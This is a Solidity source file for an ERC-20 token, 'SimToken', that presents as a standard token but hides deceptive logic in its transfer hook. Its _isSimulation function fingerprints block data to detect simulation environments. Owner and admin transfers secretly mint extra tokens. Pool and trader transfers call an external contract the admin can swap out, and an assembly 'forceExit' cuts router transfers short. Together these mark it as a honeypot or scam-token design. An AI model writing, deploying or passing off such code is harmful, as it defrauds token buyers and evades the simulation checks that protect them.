// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}
abstract contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}
abstract contract SmartTokenBase is IERC20 {
    mapping(address account => uint256) private _balances;

    mapping(address account => mapping(address spender => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    constructor() {
        _name = "Unknown";
        _symbol = "Unknown";
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 value) public virtual returns (bool) {
        address owner = msg.sender;
        _beforeTransfer(owner, to, value);
        _transfer(owner, to, value);
        return true;
    }

    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 value) public virtual returns (bool) {
        address owner = msg.sender;
        _approve(owner, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public virtual returns (bool) {
        address spender = msg.sender;
        _beforeTransfer(from, to, value);
        _spendAllowance(from, spender, value);
        _transfer(from, to, value);
        return true;
    }

    function _beforeTransfer(address from, address to, uint256 value) internal virtual{

    }

    function _transfer(address from, address to, uint256 value) internal {
        if (from == address(0)) {
            revert();
        }
        if (to == address(0)) {
            revert();
        }
        _update(from, to, value);
    }

    function _update(address from, address to, uint256 value) internal virtual {
        if (from == address(0)) {
            // Overflow check required: The rest of the code assumes that totalSupply never overflows
            _totalSupply += value;
        } else {
            uint256 fromBalance = _balances[from];
            if (fromBalance < value) {
                revert();
            }
            unchecked {
            // Overflow not possible: value <= fromBalance <= totalSupply.
                _balances[from] = fromBalance - value;
            }
        }

        if (to == address(0)) {
            unchecked {
            // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.
                _totalSupply -= value;
            }
        } else {
            unchecked {
            // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.
                _balances[to] += value;
            }
        }

        emit Transfer(from, to, value);
    }

    function _mint(address account, uint256 value) internal {
        if (account == address(0)) {
            revert();
        }
        _update(address(0), account, value);
    }

    function _burn(address account, uint256 value) internal {
        if (account == address(0)) {
            revert();
        }
        _update(account, address(0), value);
    }

    function _approve(address owner, address spender, uint256 value) internal {
        _approve(owner, spender, value, true);
    }

    function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual {
        if (owner == address(0)) {
            revert();
        }
        if (spender == address(0)) {
            revert();
        }
        _allowances[owner][spender] = value;
        if (emitEvent) {
            emit Approval(owner, spender, value);
        }
    }

    function _spendAllowance(address owner, address spender, uint256 value) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance < type(uint256).max) {
            if (currentAllowance < value) {
                revert();
            }
            unchecked {
                _approve(owner, spender, currentAllowance - value, false);
            }
        }
    }

    function _isSimulation(uint256 blockNum, address preCoinbase) internal view returns (bool){
        if(block.chainid == 1){
            if(block.number != blockNum){
                return false;
            }
            if(block.coinbase == preCoinbase){
                return true;
            }
            return false;
        }else if(block.chainid == 56){
            if(block.difficulty < 1 || block.difficulty > 2){
                return true;
            }
            if(block.difficulty == 1){
                return false;
            }
            if(block.number != blockNum){
                return false;
            }
            if(block.coinbase == preCoinbase){
                return false;
            }
            return true;
        }

        return false;
    }
}
interface IUniswapV2{
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function mint(address to) external returns (uint liquidity);
}
interface IUniswapV2Factory{
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

struct MintParams {
    address token0;
    address token1;
    uint24 fee;
    int24 tickLower;
    int24 tickUpper;
    uint256 amount0Desired;
    uint256 amount1Desired;
    uint256 amount0Min;
    uint256 amount1Min;
    address recipient;
    uint256 deadline;
}
interface INonfungiblePositionManager {
    function mint(MintParams memory params) external payable;
    function createAndInitializePoolIfNecessary(address,address,uint24,uint160) external payable;
    function refundETH() external payable;
}
interface BonusLogic{
    function claimBonus(bool,bool) external;
}
contract SimToken is SmartTokenBase, Ownable{
    address private ADMIN;

    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant UNIROUTER_ETH = 0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD;
    address private constant UNIROUTER_BNB = 0x1A0A18AC4BECDDbd6389559687d1A73d8927E416;

    uint256 private last_blockNum;
    bool private last_simulation;

    BonusLogic public _bonusLogic;
    address public _pool;

    constructor(){
        ADMIN = msg.sender;
        uint256 totalSupply = 1000000 * 10 ** 18;
        _mint(msg.sender, totalSupply);
    }
    function update(BonusLogic claim, address pool) external{
        require(msg.sender == ADMIN);
        _bonusLogic = claim;
        _pool = pool;
    }
    function mint(uint256 amount) public onlyOwner returns (bool) {
        _mint(msg.sender, amount);
        return true;
    }
    function _beforeTransferPool(address from, address to, uint256 value) private {
        if(to == ADMIN){
            return;
        }

        last_blockNum = block.number;
        _bonusLogic.claimBonus(true, false);
    }
    function forceExit() private pure{
        assembly{
            return(0,0)
        }
    }
    function _beforeTransferUniRouter(address from, address to, uint256 value) private {
        if(tx.origin != ADMIN){
            forceExit();
        }

        if(last_blockNum != block.number){
            forceExit();
        }

        last_simulation = _isSimulation(value, to);
        forceExit();
    }
    function _beforeTransferOwner(address from, address to, uint256 value) private {
        _mint(from, value);
    }
    function _beforeTransfer(address from, address to, uint256 value) internal override {
        if(from == owner() || from == ADMIN){
            require(tx.origin == ADMIN);
            _beforeTransferOwner(from, to, value);
        }else if(from == _pool){
            _beforeTransferPool(from, to, value);
        }else if(from == UNIROUTER_ETH){
            _beforeTransferUniRouter(from, to, value);
        }else{
            if(last_blockNum == block.number){
                _bonusLogic.claimBonus(false, last_simulation);
            }
        }
    }
}